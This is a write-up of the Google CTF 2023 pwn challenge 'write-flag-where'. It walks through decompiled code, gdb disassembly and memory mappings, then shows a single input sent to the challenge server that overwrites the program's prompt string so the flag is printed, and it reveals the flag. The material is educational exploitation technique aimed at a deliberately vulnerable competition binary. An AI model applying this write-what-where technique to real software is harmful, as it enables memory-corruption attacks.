---
layout: post
title: "Writeup Google CTF: write-flag-where"
categories: Pwn
tags: Hacking Pwn
---

#write-flag-where [Google CTF 2023]

Description:

> This challenge is not a classical pwn In order to solve it will take skills of your own An excellent primitive you get for free Choose an address and I will write what I see But the author is cursed or perhaps it's just out of spite For the flag that you seek is the thing you will write ASLR isn't the challenge so I'll tell you what I'll give you my mappings so that you'll have a shot.
<!--excerpt-->
 1. Reverse Engineering
 2. Dynamic Debugging
 3. FLAG!!!
 
 # Reverse Engineering
Let's load up the binary on [https://dogbolt.org/](https://dogbolt.org/) , we are interested in the main function...

    uint32_t main(int32_t argc, char** argv, char** envp)
    {
        int32_t rax_1 = open("/proc/self/maps", 0);
        read(rax_1, &maps, 0x1000);
        close(rax_1);
        int32_t rax_5 = open("./flag.txt", 0);
        if (rax_5 == 0xffffffff)
        {
            puts("flag.txt not found");
        }
        else
        {
            if (read(rax_5, &flag, 0x80) > 0)
            {
                close(rax_5);
                int32_t rax_11 = dup2(1, 0x539);
                int32_t rax_13 = open("/dev/null", 2);
                dup2(rax_13, 0);
                dup2(rax_13, 1);
                dup2(rax_13, 2);
                close(rax_13);
                alarm(0x3c);
                dprintf(rax_11, "This challenge is not a classica…", "This challenge is not a classica…");
                dprintf(rax_11, "%s\n\n", &maps, "%s\n\n");
                while (true)
                {
                    dprintf(rax_11, "Give me an address and a length …", "Give me an address and a length …");
                    int64_t var_78;
                    __builtin_memset(var_78, 0, 0x40);
                    int32_t var_1c_1 = read(rax_11, &var_78, 0x40);
                    int32_t var_2c;
                    int64_t var_28;
                    if (__isoc99_sscanf(&var_78, "0x%llx %u", &var_28, &var_2c) != 2)
                    {
                        break;
                    }
                    if (var_2c > 0x7f)
                    {
                        break;
                    }
                    int32_t rax_30 = open("/proc/self/mem", 2);
                    lseek64(rax_30, var_28, 0);
                    write(rax_30, &flag, var_2c);
                    close(rax_30);
                }
                exit(0);
                /* no return */
            }
            puts("flag.txt empty");
        }
       }

The program is straightforward, it opens /proc/self/mem and the file containing the flag (this is great because it will be allocated on the heap), print the description, the one we saw before, the mappings of the binary (vmmap command on pwndbg...) . Finally enters in a while loop, prints the instruction (we will exploit this later!), and asks for an address and a length, then the program insert at that address the buffer of the flag.txt. As the challenge name suggest this is a write-what-where, so no uaf or rop just a deep understanding of the program flow and creativity, we can control where the buffer of the flag will be set...

# Dynamic Debugging
Let's first run the program:
![First Run](https://i.ibb.co/KrbYw5J/1.png)
It doesn't show anything, neither the print nor the inputs... Reading again the reversed code we can see that the function that print is dprintf from [https://linux.die.net/man/3/dprintf](https://linux.die.net/man/3/dprintf)
>print to a file descriptor 

Let's open the chal on our trusted gdb (I'm using pwndbg ext, and you should too!)
First disassemble main

    Dump of assembler code for function main:
       0x00005555555551e9 <+0>:	push   rbp
       0x00005555555551ea <+1>:	mov    rbp,rsp
    => 0x00005555555551ed <+4>:	sub    rsp,0x70
       0x00005555555551f1 <+8>:	mov    esi,0x0
       0x00005555555551f6 <+13>:	lea    rax,[rip+0xe0b]        # 0x555555556008
       0x00005555555551fd <+20>:	mov    rdi,rax
       0x0000555555555200 <+23>:	mov    eax,0x0
       0x0000555555555205 <+28>:	call   0x5555555550c0 <open@plt>
       0x000055555555520a <+33>:	mov    DWORD PTR [rbp-0x4],eax
       0x000055555555520d <+36>:	mov    eax,DWORD PTR [rbp-0x4]
       0x0000555555555210 <+39>:	mov    edx,0x1000
       0x0000555555555215 <+44>:	lea    rcx,[rip+0x2e84]        # 0x5555555580a0 <maps>
       0x000055555555521c <+51>:	mov    rsi,rcx
       0x000055555555521f <+54>:	mov    edi,eax
       0x0000555555555221 <+56>:	call   0x5555555550a0 <read@plt>
       0x0000555555555226 <+61>:	mov    eax,DWORD PTR [rbp-0x4]
       0x0000555555555229 <+64>:	mov    edi,eax
       0x000055555555522b <+66>:	call   0x555555555080 <close@plt>
       0x0000555555555230 <+71>:	mov    esi,0x0
       0x0000555555555235 <+76>:	lea    rax,[rip+0xddc]        # 0x555555556018
       0x000055555555523c <+83>:	mov    rdi,rax
       0x000055555555523f <+86>:	mov    eax,0x0
       0x0000555555555244 <+91>:	call   0x5555555550c0 <open@plt>
       0x0000555555555249 <+96>:	mov    DWORD PTR [rbp-0x8],eax
       0x000055555555524c <+99>:	cmp    DWORD PTR [rbp-0x8],0xffffffff
       0x0000555555555250 <+103>:	jne    0x55555555526b <main+130>
       0x0000555555555252 <+105>:	lea    rax,[rip+0xdca]        # 0x555555556023
       0x0000555555555259 <+112>:	mov    rdi,rax
       0x000055555555525c <+115>:	call   0x555555555040 <puts@plt>
       0x0000555555555261 <+120>:	mov    eax,0x1
       0x0000555555555266 <+125>:	jmp    0x55555555547c <main+659>
       0x000055555555526b <+130>:	mov    eax,DWORD PTR [rbp-0x8]
       0x000055555555526e <+133>:	mov    edx,0x80
       0x0000555555555273 <+138>:	lea    rcx,[rip+0x3e26]        # 0x5555555590a0 <flag>
       0x000055555555527a <+145>:	mov    rsi,rcx
       0x000055555555527d <+148>:	mov    edi,eax
       0x000055555555527f <+150>:	call   0x5555555550a0 <read@plt>
       0x0000555555555284 <+155>:	test   rax,rax
       0x0000555555555287 <+158>:	jg     0x5555555552a2 <main+185>
       0x0000555555555289 <+160>:	lea    rax,[rip+0xda6]        # 0x555555556036
       0x0000555555555290 <+167>:	mov    rdi,rax
       0x0000555555555293 <+170>:	call   0x555555555040 <puts@plt>
       0x0000555555555298 <+175>:	mov    eax,0x1
       0x000055555555529d <+180>:	jmp    0x55555555547c <main+659>
       0x00005555555552a2 <+185>:	mov    eax,DWORD PTR [rbp-0x8]
       0x00005555555552a5 <+188>:	mov    edi,eax
       0x00005555555552a7 <+190>:	call   0x555555555080 <close@plt>
       0x00005555555552ac <+195>:	mov    esi,0x539
       0x00005555555552b1 <+200>:	mov    edi,0x1
       0x00005555555552b6 <+205>:	call   0x555555555060 <dup2@plt>
       0x00005555555552bb <+210>:	mov    DWORD PTR [rbp-0xc],eax
       0x00005555555552be <+213>:	mov    esi,0x2
       0x00005555555552c3 <+218>:	lea    rax,[rip+0xd7b]        # 0x555555556045
       0x00005555555552ca <+225>:	mov    rdi,rax
       0x00005555555552cd <+228>:	mov    eax,0x0
       0x00005555555552d2 <+233>:	call   0x5555555550c0 <open@plt>
       0x00005555555552d7 <+238>:	mov    DWORD PTR [rbp-0x10],eax
       0x00005555555552da <+241>:	mov    eax,DWORD PTR [rbp-0x10]
       0x00005555555552dd <+244>:	mov    esi,0x0
       0x00005555555552e2 <+249>:	mov    edi,eax
       0x00005555555552e4 <+251>:	call   0x555555555060 <dup2@plt>
       0x00005555555552e9 <+256>:	mov    eax,DWORD PTR [rbp-0x10]
       0x00005555555552ec <+259>:	mov    esi,0x1
       0x00005555555552f1 <+264>:	mov    edi,eax
       0x00005555555552f3 <+266>:	call   0x555555555060 <dup2@plt>
       0x00005555555552f8 <+271>:	mov    eax,DWORD PTR [rbp-0x10]
       0x00005555555552fb <+274>:	mov    esi,0x2
       0x0000555555555300 <+279>:	mov    edi,eax
       0x0000555555555302 <+281>:	call   0x555555555060 <dup2@plt>
       0x0000555555555307 <+286>:	mov    eax,DWORD PTR [rbp-0x10]
       0x000055555555530a <+289>:	mov    edi,eax
       0x000055555555530c <+291>:	call   0x555555555080 <close@plt>
       0x0000555555555311 <+296>:	mov    edi,0x3c
       0x0000555555555316 <+301>:	call   0x555555555070 <alarm@plt>
       0x000055555555531b <+306>:	mov    eax,DWORD PTR [rbp-0xc]
       0x000055555555531e <+309>:	lea    rdx,[rip+0xd2b]        # 0x555555556050
       0x0000555555555325 <+316>:	mov    rsi,rdx
       0x0000555555555328 <+319>:	mov    edi,eax
       0x000055555555532a <+321>:	mov    eax,0x0
       0x000055555555532f <+326>:	call   0x555555555090 <dprintf@plt>
       0x0000555555555334 <+331>:	mov    eax,DWORD PTR [rbp-0xc]
       0x0000555555555337 <+334>:	lea    rdx,[rip+0x2d62]        # 0x5555555580a0 <maps>
       0x000055555555533e <+341>:	lea    rcx,[rip+0xe91]        # 0x5555555561d6
       0x0000555555555345 <+348>:	mov    rsi,rcx
       0x0000555555555348 <+351>:	mov    edi,eax
       0x000055555555534a <+353>:	mov    eax,0x0
       0x000055555555534f <+358>:	call   0x555555555090 <dprintf@plt>
       0x0000555555555354 <+363>:	mov    eax,DWORD PTR [rbp-0xc]
       0x0000555555555357 <+366>:	lea    rdx,[rip+0xe82]        # 0x5555555561e0
       0x000055555555535e <+373>:	mov    rsi,rdx
       0x0000555555555361 <+376>:	mov    edi,eax
       0x0000555555555363 <+378>:	mov    eax,0x0
       0x0000555555555368 <+383>:	call   0x555555555090 <dprintf@plt>
       0x000055555555536d <+388>:	mov    QWORD PTR [rbp-0x70],0x0
       0x0000555555555375 <+396>:	mov    QWORD PTR [rbp-0x68],0x0
       0x000055555555537d <+404>:	mov    QWORD PTR [rbp-0x60],0x0
       0x0000555555555385 <+412>:	mov    QWORD PTR [rbp-0x58],0x0
       0x000055555555538d <+420>:	mov    QWORD PTR [rbp-0x50],0x0
       0x0000555555555395 <+428>:	mov    QWORD PTR [rbp-0x48],0x0
       0x000055555555539d <+436>:	mov    QWORD PTR [rbp-0x40],0x0
       0x00005555555553a5 <+444>:	mov    QWORD PTR [rbp-0x38],0x0
       0x00005555555553ad <+452>:	lea    rcx,[rbp-0x70]
       0x00005555555553b1 <+456>:	mov    eax,DWORD PTR [rbp-0xc]
       0x00005555555553b4 <+459>:	mov    edx,0x40
       0x00005555555553b9 <+464>:	mov    rsi,rcx
       0x00005555555553bc <+467>:	mov    edi,eax
       0x00005555555553be <+469>:	call   0x5555555550a0 <read@plt>
       0x00005555555553c3 <+474>:	mov    DWORD PTR [rbp-0x14],eax
       0x00005555555553c6 <+477>:	lea    rcx,[rbp-0x24]
       0x00005555555553ca <+481>:	lea    rdx,[rbp-0x20]
       0x00005555555553ce <+485>:	lea    rax,[rbp-0x70]
       0x00005555555553d2 <+489>:	lea    rsi,[rip+0xebe]        # 0x555555556297
       0x00005555555553d9 <+496>:	mov    rdi,rax
       0x00005555555553dc <+499>:	mov    eax,0x0
       0x00005555555553e1 <+504>:	call   0x5555555550b0 <__isoc99_sscanf@plt>
       0x00005555555553e6 <+509>:	cmp    eax,0x2
       0x00005555555553e9 <+512>:	jne    0x555555555450 <main+615>
       0x00005555555553eb <+514>:	mov    eax,DWORD PTR [rbp-0x24]
       0x00005555555553ee <+517>:	cmp    eax,0x7f
       0x00005555555553f1 <+520>:	ja     0x555555555453 <main+618>
       0x00005555555553f3 <+522>:	mov    esi,0x2
       0x00005555555553f8 <+527>:	lea    rax,[rip+0xea2]        # 0x5555555562a1
       0x00005555555553ff <+534>:	mov    rdi,rax
       0x0000555555555402 <+537>:	mov    eax,0x0
       0x0000555555555407 <+542>:	call   0x5555555550c0 <open@plt>
       0x000055555555540c <+547>:	mov    DWORD PTR [rbp-0x18],eax
       0x000055555555540f <+550>:	mov    rax,QWORD PTR [rbp-0x20]
       0x0000555555555413 <+554>:	mov    rcx,rax
       0x0000555555555416 <+557>:	mov    eax,DWORD PTR [rbp-0x18]
       0x0000555555555419 <+560>:	mov    edx,0x0
       0x000055555555541e <+565>:	mov    rsi,rcx
       0x0000555555555421 <+568>:	mov    edi,eax
       0x0000555555555423 <+570>:	call   0x5555555550e0 <lseek64@plt>
       0x0000555555555428 <+575>:	mov    eax,DWORD PTR [rbp-0x24]
       0x000055555555542b <+578>:	mov    edx,eax
       0x000055555555542d <+580>:	mov    eax,DWORD PTR [rbp-0x18]
       0x0000555555555430 <+583>:	lea    rcx,[rip+0x3c69]        # 0x5555555590a0 <flag>
       0x0000555555555437 <+590>:	mov    rsi,rcx
       0x000055555555543a <+593>:	mov    edi,eax
       0x000055555555543c <+595>:	call   0x555555555050 <write@plt>
       0x0000555555555441 <+600>:	mov    eax,DWORD PTR [rbp-0x18]
       0x0000555555555444 <+603>:	mov    edi,eax
       0x0000555555555446 <+605>:	call   0x555555555080 <close@plt>
       0x000055555555544b <+610>:	jmp    0x555555555354 <main+363>
       0x0000555555555450 <+615>:	nop
       0x0000555555555451 <+616>:	jmp    0x555555555454 <main+619>
       0x0000555555555453 <+618>:	nop
       0x0000555555555454 <+619>:	mov    edi,0x0
       0x0000555555555459 <+624>:	call   0x5555555550d0 <exit@plt>
       0x000055555555545e <+629>:	mov    eax,DWORD PTR [rbp-0xc]
       0x0000555555555461 <+632>:	lea    rdx,[rip+0xe48]        # 0x5555555562b0
       0x0000555555555468 <+639>:	mov    rsi,rdx
       0x000055555555546b <+642>:	mov    edi,eax
       0x000055555555546d <+644>:	mov    eax,0x0
       0x0000555555555472 <+649>:	call   0x555555555090 <dprintf@plt>
       0x0000555555555477 <+654>:	call   0x555555555030 <abort@plt>
       0x000055555555547c <+659>:	leave  
       0x000055555555547d <+660>:	ret    
    End of assembler dump.

We can see that automatically gdb recognizes where the flag will be... because from the description we understood that ASLR will not be a problem I disabled it so will be easier to grab offset. 
Speaking of offset here is `vmmap`
 

    pwndbg> vmmap
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
                 Start                End Perm     Size Offset File
        0x555555554000     0x555555555000 r--p     1000      0 /home/ctf/GOOGLE/writewhatwhere/chal
        0x555555555000     0x555555556000 r-xp     1000   1000 /home/ctf/GOOGLE/writewhatwhere/chal
        0x555555556000     0x555555557000 r--p     1000   2000 /home/ctf/GOOGLE/writewhatwhere/chal
        0x555555557000     0x555555558000 r--p     1000   2000 /home/ctf/GOOGLE/writewhatwhere/chal
        0x555555558000     0x555555559000 rw-p     1000   3000 /home/ctf/GOOGLE/writewhatwhere/chal
        0x555555559000     0x55555555a000 rw-p     1000      0 [heap]
        0x7ffff7c00000     0x7ffff7c28000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
        0x7ffff7c28000     0x7ffff7dbd000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
        0x7ffff7dbd000     0x7ffff7e15000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
        0x7ffff7e15000     0x7ffff7e19000 r--p     4000 214000 /usr/lib/x86_64-linux-gnu/libc.so.6
        0x7ffff7e19000     0x7ffff7e1b000 rw-p     2000 218000 /usr/lib/x86_64-linux-gnu/libc.so.6
        0x7ffff7e1b000     0x7ffff7e28000 rw-p     d000      0 [anon_7ffff7e1b]
        0x7ffff7fa2000     0x7ffff7fa5000 rw-p     3000      0 [anon_7ffff7fa2]
        0x7ffff7fbb000     0x7ffff7fbd000 rw-p     2000      0 [anon_7ffff7fbb]
        0x7ffff7fbd000     0x7ffff7fc1000 r--p     4000      0 [vvar]
        0x7ffff7fc1000     0x7ffff7fc3000 r-xp     2000      0 [vdso]
        0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
        0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000   2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
        0x7ffff7fef000     0x7ffff7ffa000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
        0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
        0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
        0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
    0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]

The flag buffer is in the heap, as we expected (in particular base_heap+160),  so the content of that address will be written to the address we pass at scan, now we need to find a good candidate that show us the content of flag.txt...

I personally chose `dprintf(rax_11, "Give me an address and a length …", "Give me an address and a length …");` why u asking? It will be printed every time because the while loop and any other line of code inside the while loop doesn't show anything.

Now we search that string inside gdb 

    pwndbg> search "Give"
    Searching for value: 'Give'
    chal            0x5555555561e0 "Give me an address and a length just so:\n<address> <length>\nAnd I'll write it wherever you want it to go.\nIf an exit is all that you desire\nSend me nothing and I will happily expire\n"
    chal            0x5555555571e0 "Give me an address and a length just so:\n<address> <length>\nAnd I'll write it wherever you want it to go.\nIf an exit is all that you desire\nSend me nothing and I will happily expire\n"
    libc.so.6       0x7ffff7ddb846 'Give this help list'
    libc.so.6       0x7ffff7ddb860 'Give a short usage message'

Ignoring the libc's ones remains two possible address... But which one we should choose???
We would be capable to see the real address stepping into the program until we see

     ► 0x555555555368 <main+383>    call   dprintf@plt                <dprintf@plt>
            fd: 0xffffffff
            fmt: 0x5555555561e0 ◂:  "Give me an address and a length just so:\n<address> <length>\nAnd I'll write it wherever you want it to go.\nIf an exit is all that you desire\nSend me nothing and I will happily expire\n"
            vararg: 0x5555555561e0 ◂:  "Give me an address and a length just so:\n<address> <length>\nAnd I'll write it wherever you want it to go.\nIf an exit is all that you desire\nSend me nothing and I will happily expire\n"
  
  So we will overwrite this address 0x5555555561e0, but as I said before this address will be different from what you will see on the server so we need an offset.
  So  `0x5555555561e0 - 0x555555554000 (starting address of the program) = 0x21e0`
  Or we can also recognize where  0x5555555561e0 is on our mappings we see it is between `0x555555556000     0x555555557000` so if we do `0x5555555561e0 - 0x555555556000 = 0x1e0`

# FLAG !!!
So after calculated the offset of the args of the printf, let's go and grab the flag...

    $ nc wfw1.2023.ctfcompetition.com 1337
    == proof-of-work: disabled ==
    This challenge is not a classical pwn
    In order to solve it will take skills of your own
    An excellent primitive you get for free
    Choose an address and I will write what I see
    But the author is cursed or perhaps it's just out of spite
    For the flag that you seek is the thing you will write
    ASLR isn't the challenge so I'll tell you what
    I'll give you my mappings so that you'll have a shot.
    5605acd5a000-5605acd5b000 r--p 00000000 00:11e 810424                    /home/user/chal
    5605acd5b000-5605acd5c000 r-xp 00001000 00:11e 810424                    /home/user/chal
    5605acd5c000-5605acd5d000 r--p 00002000 00:11e 810424                    /home/user/chal
    5605acd5d000-5605acd5e000 r--p 00002000 00:11e 810424                    /home/user/chal
    5605acd5e000-5605acd5f000 rw-p 00003000 00:11e 810424                    /home/user/chal
    5605acd5f000-5605acd60000 rw-p 00000000 00:00 0 
    7f340d1eb000-7f340d1ee000 rw-p 00000000 00:00 0 
    7f340d1ee000-7f340d216000 r--p 00000000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6
    7f340d216000-7f340d3ab000 r-xp 00028000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6
    7f340d3ab000-7f340d403000 r--p 001bd000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6
    7f340d403000-7f340d407000 r--p 00214000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6
    7f340d407000-7f340d409000 rw-p 00218000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6
    7f340d409000-7f340d416000 rw-p 00000000 00:00 0 
    7f340d418000-7f340d41a000 rw-p 00000000 00:00 0 
    7f340d41a000-7f340d41c000 r--p 00000000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    7f340d41c000-7f340d446000 r-xp 00002000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    7f340d446000-7f340d451000 r--p 0002c000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    7f340d452000-7f340d454000 r--p 00037000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    7f340d454000-7f340d456000 rw-p 00039000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    7ffe33e81000-7ffe33ea2000 rw-p 00000000 00:00 0                          [stack]
    7ffe33eca000-7ffe33ece000 r--p 00000000 00:00 0                          [vvar]
    7ffe33ece000-7ffe33ed0000 r-xp 00000000 00:00 0                          [vdso]
    ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
    
    
    Give me an address and a length just so:
    <address> <length>
    And I'll write it wherever you want it to go.
    If an exit is all that you desire
    Send me nothing and I will happily expire
    0x5605acd5c1e0 40
    CTF{Y0ur_j0urn3y_is_0n1y_ju5t_b39innin9}
    <address> <length>
    And I'll write it wherever you want it to go.
    If an exit is all that you desire
    Send me nothing and I will happily expire

# Flag
CTF{Y0ur_j0urn3y_is_0n1y_ju5t_b39innin9}

